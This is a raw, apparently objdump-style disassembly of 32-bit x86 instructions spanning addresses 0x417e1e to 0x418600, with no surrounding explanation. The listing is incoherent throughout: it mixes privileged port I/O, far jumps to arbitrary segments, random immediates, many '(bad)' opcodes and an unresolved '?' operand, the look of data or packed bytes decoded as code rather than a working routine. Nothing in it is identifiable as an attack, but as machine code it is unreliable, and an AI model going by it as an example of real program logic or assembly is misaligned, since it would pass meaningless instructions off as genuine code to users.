  417e1e:	push   ebp
  417e1f:	pop    ebp
  417e20:	bnd jg 0x417e8b
  417e23:	fsub   DWORD PTR [edx+eiz*4-0x71]
  417e27:	test   al,0xd6
  417e29:	push   ss
  417e2a:	std    
  417e2b:	push   es
  417e2c:	xchg   edx,eax
  417e2d:	clc    
  417e2e:	pop    ss
  417e2f:	mov    ch,ch
  417e31:	xchg   edi,eax
  417e32:	inc    edx
  417e33:	repz in eax,dx
  417e35:	mov    BYTE PTR [esp+ecx*2+0x67],dh
  417e39:	std    
  417e3a:	add    DWORD PTR [ebp-0x80],edx
  417e3d:	add    BYTE PTR [ebp-0x518aab35],dl
  417e43:	sub    eax,DWORD PTR ds:[edx-0x5ba4c1aa]
  417e4a:	pop    eax
  417e4b:	and    ah,cl
  417e4d:	xor    DWORD PTR [edi-0x6b],esp
  417e50:	fadd   QWORD PTR [ebx+esi*4]
  417e53:	out    0x3e,eax
  417e55:	or     eax,DWORD PTR [ecx+0x66]
  417e58:	xor    al,0xb2
  417e5a:	cmp    dh,BYTE PTR [esi-0x16]
  417e5d:	mov    ecx,0xef5e19ea
  417e62:	out    0x5a,al
  417e64:	scas   eax,DWORD PTR es:[edi]
  417e65:	inc    edx
  417e66:	mov    ebp,0xb5985168
  417e6b:	and    al,0xcd
  417e6d:	jp     0x417e7e
  417e6f:	loope  0x417e8e
  417e71:	cmp    eax,0xe9dc633e
  417e76:	inc    eax
  417e77:	enter  0xe73,0xc3
  417e7b:	mov    dh,0x1f
  417e7d:	int3   
  417e7e:	shl    BYTE PTR [edx-0x37a2a41e],cl
  417e84:	sub    DWORD PTR [ebp-0x65ff2c5c],edi
  417e8a:	fcmovnb st,st(4)
  417e8c:	daa    
  417e8d:	push   0x3d30b505
  417e92:	lock dec ecx
  417e94:	and    BYTE PTR [eax],bh
  417e96:	dec    ebp
  417e97:	mov    dl,0xc9
  417e99:	imul   eax,DWORD PTR [eax+0x16],0x33
  417e9d:	xchg   DWORD PTR [ebx+0x41],esi
  417ea0:	ja     0x417e5d
  417ea2:	cwde   
  417ea3:	lods   al,BYTE PTR ds:[esi]
  417ea4:	add    al,0x43
  417ea6:	add    ebp,DWORD PTR [ebx]
  417ea8:	add    DWORD PTR [ecx+esi*8-0xd5b6f29],esp
  417eaf:	dec    ebp
  417eb0:	xchg   ebx,eax
  417eb1:	mov    ch,0xd1
  417eb3:	jmp    0xa989:0xb1703a21
  417eba:	aad    0xb2
  417ebc:	pop    ebp
  417ebd:	mov    esp,0x36c223be
  417ec2:	jnp    0x417f1e
  417ec4:	mov    ebp,0xab2715ce
  417ec9:	add    DWORD PTR [esi],eax
  417ecb:	and    DWORD PTR [edx+0x5c48a6fa],0xffffffb5
  417ed2:	dec    ebx
  417ed3:	lock std 
  417ed5:	pop    es
  417ed6:	ficomp DWORD PTR [esi+0x263b32bc]
  417edc:	inc    ecx
  417edd:	stos   BYTE PTR es:[edi],al
  417ede:	jecxz  0x417f22
  417ee0:	loopne 0x417f28
  417ee2:	push   es
  417ee3:	sbb    al,0x57
  417ee5:	jmp    0x98f1:0xed8149a9
  417eec:	mov    ds:0x6b3dbc4c,eax
  417ef1:	adc    ebp,DWORD PTR [edx+0x25]
  417ef4:	(bad)  
  417ef5:	cmc    
  417ef6:	mov    ecx,0x612a1c5a
  417efb:	mov    ch,0x79
  417efd:	in     al,dx
  417efe:	inc    esi
  417eff:	jmp    0xd783:0xe2474dd8
  417f06:	sbb    eax,0xe0e451f4
  417f0b:	gs inc esi
  417f0d:	test   al,0x36
  417f0f:	int    0xd6
  417f11:	loopne 0x417f5b
  417f13:	aad    0x38
  417f15:	and    DWORD PTR [edx+0x382255d2],0xf250849f
  417f1f:	mov    eax,ds:0x200b69f5
  417f24:	sub    BYTE PTR [ecx],0x60
  417f27:	add    esp,DWORD PTR [edx-0x1ca6b0f0]
  417f2d:	dec    esp
  417f2e:	shr    esp,1
  417f30:	xor    BYTE PTR [edx+0x257270bf],ch
  417f36:	ins    BYTE PTR es:[edi],dx
  417f37:	fst    QWORD PTR [ebx-0xf]
  417f3a:	xor    al,0xb3
  417f3c:	jne    0x417f3f
  417f3e:	(bad)  
  417f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f40:	sbb    al,0xeb
  417f42:	or     bh,BYTE PTR [edx-0x19]
  417f45:	call   0xfcd79ddd
  417f4a:	cmp    BYTE PTR [ebp-0x7b],0xd6
  417f4e:	outs   dx,DWORD PTR ds:[esi]
  417f4f:	mov    eax,ds:0x21a598fc
  417f54:	mov    cl,0x50
  417f56:	xor    edi,DWORD PTR [edx+0x52b146ba]
  417f5c:	xchg   esi,eax
  417f5d:	pushf  
  417f5e:	mov    DWORD PTR [eax-0x16],0x4064baef
  417f65:	add    ecx,edx
  417f67:	mov    bh,0x8
  417f69:	xchg   DWORD PTR [esi-0x4d],ebx
  417f6c:	outs   dx,BYTE PTR ds:[esi]
  417f6d:	dec    eax
  417f6e:	dec    esi
  417f6f:	adc    ah,BYTE PTR [edi]
  417f71:	cmp    DWORD PTR [ecx],ebp
  417f73:	adc    al,0x89
  417f75:	icebp  
  417f76:	add    BYTE PTR [eax+0x67],cl
  417f79:	mov    ds:0x5812d168,al
  417f7e:	sbb    edi,DWORD PTR [edx-0x4f6d5f85]
  417f84:	sar    eax,1
  417f86:	or     edi,DWORD PTR [edx+0x7d]
  417f89:	mov    BYTE PTR [ebp-0xf44feb8],dh
  417f8f:	ror    DWORD PTR [eax-0x627ef8a3],0x53
  417f96:	pusha  
  417f97:	xchg   edi,eax
  417f98:	scas   al,BYTE PTR es:[edi]
  417f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f9a:	mov    ebp,0x3968093e
  417f9f:	out    0xa5,eax
  417fa1:	sub    al,0x87
  417fa3:	aas    
  417fa4:	pop    esi
  417fa5:	aad    0x76
  417fa7:	inc    edi
  417fa8:	adc    ebx,DWORD PTR [ecx+0x1]
  417fab:	mov    bl,0x40
  417fad:	push   ebp
  417fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417faf:	ret    
  417fb0:	test   eax,0x1228800d
  417fb5:	fidivr WORD PTR [ebp+edx*4+0x1d40690e]
  417fbc:	(bad)  
  417fbe:	lock pop es
  417fc0:	pop    es
  417fc1:	sbb    al,0xcd
  417fc3:	div    DWORD PTR [ecx+ecx*2+0x36b9eb37]
  417fca:	ret    0x14fe
  417fcd:	pop    ecx
  417fce:	push   ebp
  417fcf:	jmp    0x417f8a
  417fd1:	mov    ebx,0xdfa8ab45
  417fd6:	mov    eax,ds:0x843d115a
  417fdb:	dec    eax
  417fdc:	mov    ebp,edx
  417fde:	inc    esi
  417fdf:	lock inc ecx
  417fe1:	jb     0x417f9e
  417fe3:	out    dx,eax
  417fe4:	scas   al,BYTE PTR es:[edi]
  417fe5:	call   0xf3bc:0x3b6c94f8
  417fec:	fwait
  417fed:	and    ecx,DWORD PTR [eax-0x63]
  417ff0:	outs   dx,DWORD PTR ds:[esi]
  417ff1:	fistp  WORD PTR [edi]
  417ff3:	dec    ebp
  417ff4:	sub    edi,esi
  417ff6:	shl    bl,0x21
  417ff9:	ds push ds
  417ffb:	retf   
  417ffc:	xchg   al,ch
  417ffe:	dec    esi
  417fff:	pop    edx
  418000:	aaa    
  418001:	je     0x41804e
  418003:	stos   BYTE PTR es:[edi],al
  418004:	push   es
  418005:	pusha  
  418006:	dec    esi
  418007:	fnsave [ebx+0xb35da14]
  41800d:	mov    eax,0xd5cebcaf
  418012:	push   cs
  418013:	jg     0x418053
  418015:	and    eax,0x72117cc8
  41801a:	xchg   edx,eax
  41801b:	push   ss
  41801c:	jmp    0xd5127cf4
  418021:	pop    eax
  418022:	aam    0xe4
  418024:	mov    eax,0xd2c2770f
  418029:	inc    edi
  41802a:	cmp    DWORD PTR [esi+edx*1],esi
  41802d:	div    BYTE PTR [esi-0x6]
  418030:	xlat   BYTE PTR ds:[ebx]
  418031:	xchg   ecx,ebx
  418033:	add    al,0x5a
  418036:	ret    0x842e
  418039:	fcomp  QWORD PTR [ecx+esi*2+0x35]
  41803d:	call   0x354c4e0d
  418042:	loope  0x418036
  418044:	xchg   DWORD PTR [edx+edx*8],esi
  418047:	loopne 0x4180b5
  418049:	push   edi
  41804a:	pop    esi
  41804b:	push   ds
  41804c:	or     dh,dh
  41804e:	mov    BYTE PTR [edx-0x46],dh
  418051:	outs   dx,DWORD PTR ds:[esi]
  418052:	ja     0x4180d3
  418054:	jle    0x4180c1
  418056:	int3   
  418057:	jl     0x417ffb
  418059:	mov    ebp,0x594961f6
  41805e:	dec    ebp
  41805f:	ins    DWORD PTR es:[edi],dx
  418060:	int3   
  418061:	jns    0x418096
  418063:	mov    ah,0xb3
  418065:	mov    ecx,0x234f79a7
  41806a:	mov    ecx,0x68bbf62c
  41806f:	into   
  418070:	into   
  418071:	and    DWORD PTR [edx],edx
  418073:	xor    edx,DWORD PTR [edi+0x45]
  418076:	add    dl,al
  418078:	int    0x7
  41807a:	add    DWORD PTR [edx-0x4ba637e5],ebx
  418080:	sub    edi,edx
  418082:	pop    ebx
  418083:	(bad)  
  418084:	push   edi
  418085:	pop    ebp
  418086:	dec    ecx
  418087:	pop    ecx
  418088:	or     DWORD PTR [esi+0xa797a30],ebx
  41808e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41808f:	in     al,0xd1
  418091:	test   BYTE PTR [edi+0x7f098238],ch
  418097:	and    eax,0x4a36b134
  41809c:	clc    
  41809d:	adc    ecx,0xfffffffe
  4180a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a1:	push   es
  4180a2:	div    BYTE PTR [edx+0x3ab2c943]
  4180a8:	inc    ebp
  4180a9:	cmp    DWORD PTR [eax-0x7aa39131],0x86bc4148
  4180b3:	aam    0x6f
  4180b5:	adc    BYTE PTR [edi-0x3d915b28],bl
  4180bb:	inc    eax
  4180bc:	mov    ch,BYTE PTR [esi+0x1a69643e]
  4180c2:	cli    
  4180c3:	jbe    0x41806b
  4180c5:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4180c7:	add    ah,BYTE PTR [edi]
  4180c9:	xlat   BYTE PTR ds:[ebx]
  4180ca:	addr16 push 0x74
  4180cd:	jns    0x4180e5
  4180cf:	gs pop edi
  4180d1:	mov    di,0xbb23
  4180d5:	loopne 0x418098
  4180d7:	or     al,0xe0
  4180d9:	dec    ebx
  4180da:	aad    0x5d
  4180dc:	fwait
  4180dd:	push   esi
  4180de:	dec    edi
  4180df:	pop    edi
  4180e0:	adc    al,0xf9
  4180e2:	clc    
  4180e3:	pop    ss
  4180e4:	inc    edi
  4180e5:	jg     0x418072
  4180e7:	push   0x2ab5ade
  4180ec:	stos   DWORD PTR es:[edi],eax
  4180ed:	cmp    dh,BYTE PTR [bx+0x13]
  4180f1:	enter  0xbe76,0xa9
  4180f5:	add    al,0x56
  4180f7:	cmp    DWORD PTR [eax],edx
  4180f9:	sar    DWORD PTR [esi-0x4c4fb200],0x40
  418100:	sar    BYTE PTR [edi],cl
  418102:	mov    bl,0xe3
  418104:	sub    DWORD PTR [esi-0x5f8a124f],esp
  41810a:	retf   
  41810b:	scas   eax,DWORD PTR es:[edi]
  41810c:	icebp  
  41810d:	stc    
  41810e:	cmc    
  41810f:	mov    bl,0x4d
  418111:	mov    ah,0xd6
  418113:	(bad)  
  418116:	(bad)  
  418118:	leave  
  418119:	mov    cl,0x89
  41811b:	push   esi
  41811c:	or     al,BYTE PTR [edx+0x77]
  41811f:	push   0x1ccba6ad
  418124:	sar    BYTE PTR [eax],cl
  418126:	push   ebx
  418127:	push   ecx
  418128:	pop    esi
  418129:	xchg   DWORD PTR [eax-0x38ceb5f0],esi
  41812f:	jb     0x418170
  418131:	xor    al,0x5d
  418133:	push   edx
  418134:	dec    ecx
  418135:	pop    ds
  418136:	jbe    0x4180f9
  418138:	sti    
  418139:	std    
  41813a:	mov    cl,0xb4
  41813c:	jp     0x418162
  41813e:	add    al,0xcf
  418140:	sbb    bl,BYTE PTR [ebx+ecx*4]
  418143:	add    eax,0x11275c16
  418148:	jecxz  0x41816d
  41814a:	mov    cl,0x72
  41814c:	dec    ecx
  41814d:	sub    al,0x27
  41814f:	mov    ebx,0xee50a200
  418154:	push   0xdbba3e80
  418159:	push   es
  41815a:	sbb    esi,edi
  41815c:	sub    eax,0xad66add8
  418161:	mov    ah,0x58
  418163:	and    DWORD PTR [eax-0x14c31c81],edi
  418169:	push   es
  41816a:	fldcw  WORD PTR [edx]
  41816c:	pushf  
  41816d:	and    esi,DWORD PTR [bp-0x5f]
  418171:	out    dx,al
  418172:	mov    edx,0x5460f00d
  418177:	mov    DWORD PTR [eax-0x33],ebx
  41817a:	mov    cl,0xb4
  41817c:	pop    ss
  41817d:	mov    eax,0x92993857
  418182:	shr    ah,1
  418184:	(bad)  
  418185:	adc    DWORD PTR [ebp+0x7],eax
  418188:	stos   BYTE PTR es:[edi],al
  418189:	mov    ah,0xb1
  41818b:	bound  eax,QWORD PTR [ebp+0x6327a1e7]
  418191:	mov    esp,0x59eefc88
  418196:	inc    esi
  418197:	imul   ebx,DWORD PTR [edi+ecx*2],0xb4be8de0
  41819e:	std    
  41819f:	sbb    eax,DWORD PTR [edi-0x3a1819ac]
  4181a5:	stos   BYTE PTR es:[edi],al
  4181a6:	fsubr  DWORD PTR [eax-0x51110974]
  4181ac:	(bad)  
  4181ad:	mov    edx,0x4b4a10e8
  4181b2:	inc    ebp
  4181b3:	cmp    BYTE PTR [ecx-0x7930d592],bl
  4181b9:	lods   eax,DWORD PTR ds:[esi]
  4181ba:	jo     0x418149
  4181bc:	fldcw  WORD PTR [edx+0x1b]
  4181bf:	lahf   
  4181c0:	inc    edi
  4181c1:	jle    0x418179
  4181c3:	and    DWORD PTR [eax+0x27],eax
  4181c6:	mov    al,0xbc
  4181c8:	xlat   BYTE PTR ds:[ebx]
  4181c9:	push   ds
  4181ca:	cmp    DWORD PTR [eax+0xcb821c6],ebx
  4181d0:	jae    0x418155
  4181d2:	and    BYTE PTR [ebp-0x6c],bh
  4181d5:	call   0x17f36d2
  4181da:	lds    ecx,FWORD PTR [edi+eax*8+0x66af0a7a]
  4181e1:	xchg   esi,ecx
  4181e3:	jo     0x4181f0
  4181e5:	push   esp
  4181e6:	add    DWORD PTR [ecx-0x60],edi
  4181e9:	sti    
  4181ea:	add    al,0x8b
  4181ec:	arpl   bx,dx
  4181ee:	adc    BYTE PTR [edx+0x587034af],0x3b
  4181f5:	or     eax,0xfee4917b
  4181fa:	xchg   DWORD PTR [edx],eax
  4181fc:	pop    es
  4181fd:	shl    BYTE PTR [esi+eiz*2-0x16e37696],1
  418204:	sbb    esp,DWORD PTR [esi+0x29]
  418207:	cmp    DWORD PTR [ebp+0x76],esi
  41820a:	pusha  
  41820b:	jae    0x4181ab
  41820d:	mov    WORD PTR [eax+ecx*4-0x678f6437],fs
  418214:	popa   
  418215:	mov    dl,0xa7
  418217:	push   DWORD PTR [esi+0x5317df59]
  41821d:	xor    ebp,DWORD PTR [edx+0x1b430184]
  418223:	pop    ebx
  418224:	sbb    DWORD PTR ds:0xc4f66b79,eax
  41822a:	retf   0xecbd
  41822d:	jg     0x4181f3
  41822f:	push   ss
  418230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418231:	dec    ebx
  418232:	scas   al,BYTE PTR es:[edi]
  418233:	ds ins BYTE PTR es:[edi],dx
  418235:	mov    ecx,0x7a6baf02
  41823a:	inc    edx
  41823b:	pop    edi
  41823c:	jmp    DWORD PTR [ebx-0x6f]
  41823f:	mov    ah,0x4e
  418241:	fcmovnbe st,st(3)
  418243:	jnp    0x41823d
  418245:	and    bh,ch
  418247:	sub    esi,DWORD PTR [ebp+0x687a642d]
  41824d:	in     eax,0xf2
  41824f:	sbb    BYTE PTR [edi-0x25ffe3bf],cl
  418255:	neg    DWORD PTR [esp+ebp*1+0x187743a0]
  41825c:	sub    ch,BYTE PTR [edi-0x56]
  41825f:	enter  0x3c6a,0xee
  418263:	push   0x6e
  418265:	dec    esp
  418266:	mov    WORD PTR [ecx],cs
  418268:	and    eax,0x1d3c2c53
  41826d:	inc    ebp
  41826e:	jmp    ebp
  418270:	adc    eax,DWORD PTR [esi]
  418272:	inc    edi
  418273:	sar    BYTE PTR [ebx+ecx*2],0xb0
  418277:	cld    
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	aaa    
  41827a:	mov    ds:0x6caa31c2,al
  41827f:	xchg   DWORD PTR [esi],esi
  418281:	push   esp
  418282:	dec    ebp
  418283:	add    eax,0x78f1bff2
  418288:	or     eax,0x742098f
  41828d:	bound  edi,QWORD PTR [ebp-0x55]
  418290:	and    al,0xde
  418292:	mov    ebp,edi
  418294:	(bad)  
  418295:	jbe    0x418273
  418297:	test   al,0xea
  418299:	ss add eax,0x4954bfdf
  41829f:	cmp    esp,DWORD PTR [ecx-0x41cb5a9f]
  4182a5:	dec    ebx
  4182a6:	mul    BYTE PTR [eax]
  4182a8:	add    BYTE PTR [ebx-0x668bb36],dh
  4182ae:	mov    dh,0x53
  4182b0:	data16 sub cl,BYTE PTR [ebx-0x3e]
  4182b4:	push   eax
  4182b5:	add    bh,BYTE PTR [edx]
  4182b7:	push   esp
  4182b8:	mov    WORD PTR [edi-0xd],es
  4182bb:	aaa    
  4182bc:	and    esi,DWORD PTR ds:0xe42a5a6f
  4182c2:	mov    al,ds:0x720a88fc
  4182c7:	mov    edi,0x449a6208
  4182cc:	stos   DWORD PTR es:[edi],eax
  4182cd:	int    0xa6
  4182cf:	(bad)  
  4182d2:	jno    0x4182bb
  4182d4:	add    al,0xfd
  4182d6:	fdiv   DWORD PTR [ecx-0x429c64bf]
  4182dc:	sub    eax,0xe9457e08
  4182e1:	jb     0x41830f
  4182e3:	(bad)  
  4182e4:	or     BYTE PTR [esi-0x8],ch
  4182e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182e8:	pop    esi
  4182e9:	loopne 0x418292
  4182eb:	mov    ecx,0xf804fb19
  4182f0:	imul   ecx,ebp,0xffffffe7
  4182f3:	in     eax,dx
  4182f4:	arpl   WORD PTR [ecx-0x3d],dx
  4182f7:	and    DWORD PTR [edx+ebp*2],0xc292cc3d
  4182fe:	add    esi,DWORD PTR [ebx]
  418300:	in     eax,0x94
  418302:	mov    ds:0x8008607a,eax
  418307:	xchg   esi,esi
  418309:	xor    eax,0x4b8ec13d
  41830e:	add    ecx,edi
  418310:	jecxz  0x4182f3
  418312:	jge    0x418322
  418314:	cmp    eax,0xea6c8ba2
  418319:	ja     0x4182c1
  41831b:	or     DWORD PTR [eax],esi
  41831d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41831e:	inc    esi
  41831f:	int3   
  418320:	xchg   ecx,eax
  418321:	xchg   edx,eax
  418322:	scas   al,BYTE PTR es:[edi]
  418323:	adc    BYTE PTR [ebp+0x10],bh
  418326:	adc    cl,ch
  418328:	ja     0x418314
  41832a:	into   
  41832b:	or     eax,0x291b4e55
  418330:	xor    BYTE PTR [ebx+edi*2],ah
  418333:	sbb    al,0xcb
  418335:	scas   al,BYTE PTR es:[edi]
  418336:	push   ebp
  418337:	daa    
  418338:	jl     0x418382
  41833a:	daa    
  41833b:	or     al,0x6f
  41833d:	aam    0x6a
  41833f:	add    al,0x26
  418341:	mov    ah,0x58
  418343:	outs   dx,DWORD PTR ds:[esi]
  418344:	inc    edi
  418345:	push   cs
  418346:	mov    dl,0x3d
  418348:	(bad)  
  418349:	js     0x41833c
  41834b:	retf   0xcf13
  41834e:	inc    ebp
  41834f:	and    bl,bl
  418351:	inc    eax
  418352:	and    dh,BYTE PTR [ecx+0x20f5b3b2]
  418358:	adc    ch,BYTE PTR ds:0xede49689
  41835e:	icebp  
  41835f:	jg     0x4182f5
  418361:	dec    esi
  418362:	add    edi,esi
  418364:	push   ss
  418365:	mov    esp,ebx
  418367:	sbb    al,0x11
  418369:	and    al,0xfd
  41836b:	cs repnz out dx,eax
  41836e:	push   es
  41836f:	jbe    0x4183e6
  418371:	aas    
  418372:	pop    ss
  418373:	fmul   QWORD PTR [edi+0x321923e5]
  418379:	sbb    al,0x73
  41837b:	cmp    bl,BYTE PTR [esi*2-0x7c53d73c]
  418382:	fcomp  QWORD PTR [eax]
  418384:	(bad)  
  418385:	jmp    0x418328
  418387:	jmp    0x3f96:0x171f87c6
  41838e:	repnz outs dx,BYTE PTR ds:[esi]
  418390:	aaa    
  418391:	fnstsw WORD PTR [edi]
  418393:	fld    DWORD PTR [ebp-0x32a45bbd]
  418399:	mov    esp,0xdece8596
  41839e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41839f:	in     eax,dx
  4183a0:	pop    ecx
  4183a1:	add    ebp,DWORD PTR [edi]
  4183a3:	not    esi
  4183a5:	popf   
  4183a6:	fistp  QWORD PTR [eax+0x6e]
  4183a9:	enter  0xc240,0x4e
  4183ad:	and    al,0x71
  4183af:	rol    DWORD PTR [ebp+0xd],cl
  4183b2:	bound  edx,QWORD PTR [edx]
  4183b4:	adc    al,0x7e
  4183b6:	inc    ecx
  4183b7:	xchg   edx,eax
  4183b8:	xor    dh,bh
  4183ba:	dec    eax
  4183bb:	inc    ecx
  4183bc:	and    al,0xb5
  4183be:	nop
  4183bf:	or     eax,0xb8eef388
  4183c4:	pushf  
  4183c5:	xlat   BYTE PTR ds:[ebx]
  4183c7:	mov    ebp,0x42ec1a66
  4183cc:	data16 mov dh,0x36
  4183cf:	cmovle edx,DWORD PTR [ecx+edx*8+0x37888f2a]
  4183d7:	ret    
  4183d8:	add    eax,0xa4381c2f
  4183dd:	or     bh,bh
  4183df:	xchg   BYTE PTR [ebp+0x3c713cb],ch
  4183e5:	fstp   st(4)
  4183e7:	and    eax,0xfe3a4e9
  4183ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183ed:	push   edi
  4183ee:	sub    bh,bl
  4183f0:	mov    cl,0xc6
  4183f2:	sti    
  4183f3:	add    al,0xff
  4183f5:	in     al,dx
  4183f6:	xchg   esi,eax
  4183f7:	test   al,0xb2
  4183f9:	gs jge 0x4183bb
  4183fc:	or     dl,dh
  4183fe:	sub    BYTE PTR [ecx],0x77
  418401:	int    0xa1
  418403:	mov    dl,0x1d
  418405:	hlt    
  418406:	sbb    BYTE PTR [edi+0x5e28069e],bl
  41840c:	es dec ecx
  41840e:	iret   
  41840f:	daa    
  418410:	lods   eax,DWORD PTR ds:[esi]
  418411:	imul   esi,DWORD PTR [eax],0x7e
  418414:	jb     0x418477
  418416:	cmp    al,0x20
  418418:	sbb    al,0x8
  41841a:	or     esi,DWORD PTR [edi]
  41841c:	add    eax,0x8ee32dff
  418421:	add    eax,0x28e5c8a0
  418426:	fnsave [edi]
  418428:	call   0x572c:0xcc9fe1b
  41842f:	sbb    eax,0xb95650ca
  418434:	and    al,0x89
  418436:	pusha  
  418437:	and    ah,BYTE PTR [ebp-0x80]
  41843a:	jmp    0x8b697fe8
  41843f:	ret    0xa609
  418442:	add    eax,0xb0a5a490
  418447:	icebp  
  418448:	dec    edi
  418449:	add    edx,esp
  41844b:	add    DWORD PTR [ebp-0x42fa10ba],edi
  418451:	(bad)  
  418452:	mov    dh,0x9e
  418454:	popa   
  418455:	cmp    dl,BYTE PTR ds:0x52125df2
  41845b:	int    0x69
  41845d:	dec    ebx
  41845e:	xor    DWORD PTR [ecx+edx*2],esp
  418461:	push   0xc6157dbb
  418466:	fadd   QWORD PTR [eax-0x61]
  418469:	or     al,0x59
  41846b:	test   edi,edi
  41846d:	int3   
  41846e:	cmp    BYTE PTR [edx],ah
  418470:	pusha  
  418471:	je     0x418413
  418473:	fwait
  418474:	shl    DWORD PTR [ebx],cl
  418476:	popf   
  418477:	mov    ds:0x9b441b43,al
  41847c:	xchg   BYTE PTR [edi-0xa],dh
  41847f:	retf   
  418480:	fisubr WORD PTR [esi+0x2491e2d5]
  418486:	adc    DWORD PTR [edi],edx
  418488:	sti    
  418489:	fidiv  DWORD PTR [esi-0x78]
  41848c:	(bad)  
  41848d:	push   ebp
  41848e:	mov    dh,BYTE PTR [ebp-0x706a0c9b]
  418494:	xchg   ebp,eax
  418495:	sub    DWORD PTR [ebx+ecx*2-0x345f2c01],edi
  41849c:	and    ebx,DWORD PTR [edi]
  41849e:	and    BYTE PTR [ebx],0xec
  4184a1:	cs dec ebp
  4184a3:	adc    BYTE PTR [ebp+0x17f8d334],al
  4184a9:	les    ebp,FWORD PTR [edi+0x7b31a018]
  4184af:	cwde   
  4184b0:	call   0xe36e3e0
  4184b5:	push   eax
  4184b6:	scas   eax,DWORD PTR es:[edi]
  4184b7:	pop    esp
  4184b8:	aaa    
  4184b9:	pop    esi
  4184ba:	add    eax,0xc9e45624
  4184bf:	xchg   ebp,eax
  4184c0:	and    ah,BYTE PTR [esi]
  4184c2:	scas   al,BYTE PTR es:[edi]
  4184c3:	dec    edx
  4184c4:	mov    ?,WORD PTR [edi]
  4184c6:	loopne 0x41844b
  4184c8:	ja     0x8c984a2
  4184ce:	xchg   esi,eax
  4184cf:	adc    DWORD PTR [edx],ebp
  4184d1:	mov    dh,0xe8
  4184d3:	mov    ebx,0x32297484
  4184d8:	mov    al,ds:0x46e0c222
  4184dd:	in     eax,dx
  4184de:	lahf   
  4184df:	mov    ds,edi
  4184e1:	call   0xced0:0xb3347c15
  4184e8:	aad    0xf1
  4184ea:	int3   
  4184eb:	or     edx,DWORD PTR [ecx+0x1f82b4e9]
  4184f1:	sbb    dl,ah
  4184f3:	sub    dh,BYTE PTR [ebx-0x1f]
  4184f6:	(bad)  
  4184f7:	call   0xa7bee20d
  4184fc:	cmp    bh,dh
  4184fe:	sub    edx,ebp
  418500:	xor    eax,0x690d2aa7
  418505:	shl    BYTE PTR [esi+0x53bd1a3c],1
  41850b:	int3   
  41850c:	mov    dh,0x70
  41850e:	pushf  
  41850f:	mov    esi,0x5fb4cae0
  418514:	test   eax,0x8a70b842
  418519:	cmp    al,0xb4
  41851b:	(bad)  
  41851c:	fidivr WORD PTR [ecx+0x62]
  41851f:	dec    edx
  418520:	inc    DWORD PTR [esi-0x5c]
  418523:	or     ecx,DWORD PTR [eax-0x69023c9d]
  418529:	xor    ch,BYTE PTR [ebx+0x75]
  41852c:	jnp    0x41851a
  41852e:	test   eax,0x64055eca
  418533:	sub    eax,0x26361abb
  418538:	mov    ah,0xdd
  41853a:	mov    ch,0x2c
  41853c:	add    al,0xa2
  41853e:	std    
  41853f:	nop
  418540:	xchg   esp,ecx
  418542:	mov    ah,0xf9
  418544:	jb     0x41856f
  418546:	call   0x77df:0xce0eb335
  41854d:	ficom  DWORD PTR [ebp-0x9]
  418550:	dec    edi
  418551:	pop    es
  418552:	jo     0x41851b
  418554:	mov    dh,0xe0
  418556:	clc    
  418557:	dec    ecx
  418558:	gs xchg ebp,eax
  41855a:	push   ecx
  41855b:	call   0x9af1a8d4
  418560:	mov    cl,0x33
  418562:	mov    WORD PTR [ebx],ds
  418564:	jecxz  0x418552
  418566:	(bad)  
  418567:	xchg   ecx,eax
  418568:	shr    ebp,0x5
  41856b:	xor    bl,BYTE PTR [edi-0x14]
  41856e:	mov    eax,0x14664629
  418573:	jnp    0x418528
  418575:	sbb    ah,bl
  418577:	scas   eax,DWORD PTR es:[edi]
  418578:	mov    eax,0xe2997946
  41857d:	dec    esp
  41857e:	retf   0xf38f
  418581:	push   edi
  418582:	push   esp
  418583:	mov    dl,0x9f
  418585:	neg    DWORD PTR [eax+0x33]
  418588:	stos   DWORD PTR es:[edi],eax
  418589:	popa   
  41858a:	and    al,0xa2
  41858c:	ins    DWORD PTR es:[edi],dx
  41858d:	xor    eax,0x5db1c1ee
  418592:	mov    al,0x5d
  418594:	or     bl,ch
  418596:	adc    esp,ebx
  418598:	cmp    eax,0x313946f0
  41859d:	add    DWORD PTR [ebp+0x15],ecx
  4185a0:	xlat   BYTE PTR ds:[ebx]
  4185a1:	cmp    DWORD PTR [esi-0x53],ebp
  4185a4:	sbb    DWORD PTR [esi],esi
  4185a6:	mov    ah,BYTE PTR [edx]
  4185a8:	mov    dh,0x14
  4185aa:	jns    0x4185ca
  4185ac:	cwde   
  4185ad:	mov    ds:0x310d4007,eax
  4185b2:	adc    ch,cl
  4185b4:	add    BYTE PTR es:[ecx-0x76],bh
  4185b8:	jns    0x418601
  4185ba:	neg    al
  4185bc:	data16 jno 0x418620
  4185bf:	jmp    0x33d4:0x1c644561
  4185c6:	pop    ss
  4185c7:	sub    ebx,DWORD PTR [edi]
  4185c9:	inc    esp
  4185ca:	sahf   
  4185cb:	scas   eax,DWORD PTR es:[edi]
  4185cc:	fbstp  TBYTE PTR [ecx+0x50]
  4185cf:	and    esp,edi
  4185d1:	and    edx,DWORD PTR [edi+edx*8+0x11]
  4185d5:	stos   DWORD PTR es:[edi],eax
  4185d6:	test   al,0xcf
  4185d8:	or     al,0xf
  4185da:	fstp   DWORD PTR [eax+0x78]
  4185dd:	ds data16 test al,0xa9
  4185e1:	clc    
  4185e2:	fdivr  QWORD PTR [edi+0x5fb0c28e]
  4185e8:	gs in  eax,0xae
  4185eb:	bound  ebp,QWORD PTR [eax-0x48cdaf0e]
  4185f1:	dec    ebx
  4185f2:	cmp    DWORD PTR [esi+edx*8],0xffffff8a
  4185f6:	jmp    0x4185e5
  4185f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f9:	cmc    
  4185fa:	dec    edx
  4185fb:	les    ecx,FWORD PTR [esi]
  4185fd:	popa   
  4185fe:	mov    ch,0x5f
  418600:	outs   dx,DWORD PTR gs:[esi]
